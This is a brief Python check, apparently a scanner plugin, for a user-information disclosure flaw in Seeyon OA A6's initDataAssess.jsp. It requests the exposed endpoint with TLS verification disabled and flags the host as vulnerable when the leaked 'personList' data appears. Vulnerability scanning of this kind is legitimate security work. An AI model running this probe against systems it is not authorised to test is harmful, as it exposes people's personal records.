#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '致远OA A6 initDataAssess.jsp 用户敏感信息泄露',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/yyoa/assess/js/initDataAssess.jsp'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=10,verify=False)
    if "/yyoa/index.jsp" not in res.text and "personList" in res.text and res.status_code == 200:
      ret['ifbug'] = True
      # ret['huixian'] = res.text
      res.close()
      return ret
    else:
      return ret
  except:
    return ret